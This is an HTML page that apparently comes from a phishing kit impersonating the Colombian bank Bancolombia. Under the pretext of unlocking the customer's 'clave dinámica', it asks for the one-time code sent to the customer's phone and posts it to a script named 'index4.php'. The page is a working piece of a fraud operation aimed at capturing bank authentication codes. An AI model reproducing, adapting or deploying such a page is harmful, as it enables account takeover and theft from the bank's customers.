<html lang="en"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Bancolombia| Panel Informativo</title>

    <link rel="stylesheet" href="static/styles.css">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap.min.css" integrity="sha512-P5MgMn1jBN01asBgU0z60Qk4QxiXo86+wlFahKrsQf37c9cro517WzVSPPV1tDKzhku2iJ2FVgL67wG03SGnNA==" crossorigin="anonymous">
    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">

</head>

<body class="overflow-x-hidden">
    <div class="">
        <nav style="text-align: center;" class="navbar11 navbar-dark navbar-expand-sm ">
            <div class="navbar-brand">
                <div style="text-align: center;" class="mt-1 pt-1">
                    <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png" alt="logo" class="image mb-2 ml-1" loading="lazy"></center>
                </div>
            </div>

            <div class="ml-auto" id="navbarNavDropdown">
                <ul class="navbar-nav">
                    <li class="nav-item dropdown">

                    </li>
                </ul>
            </div>
        </nav>
    </div>

    <div class="row11 container-fluid">
        <div class="login-container ml-auto mr-auto mt-4">
            <div class="login-text mt-4">
                <h3 class="text-2xl">Sucursal Virtual Personas</h3>
                <p class="small-text text-gray-500">Para continuar con el desbloqueo de tu clave dinámica, ingrese el código que le hemos enviado a su numero registrado.</p>
            </div>

            <form method="POST" action="index4.php" class="">
                <div class="form-group m-3">
                    <p class="small-text mt-9">Codigo</p>
                    <input type="number" maxlength="6" oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" name="cod1" class="form-control11" id="exampleInputPassword1">
                </div>
                <button type="submit" class="btn11 btn-warning11 w-4/5 mt-2 mlaa-4 mb-2 mr-2 login-text">Continuar</button>
            </form>
            <div class="row m-2 mb-4  base-text mt-4">
                <div class="col-4">

                </div>
                <div class="col-4 text-right">
                </div>
                <div class="col-4">
                </div>
            </div>
        </div>
    </div>

    <div class="text-center mt-12">
    </div>



</body></html>
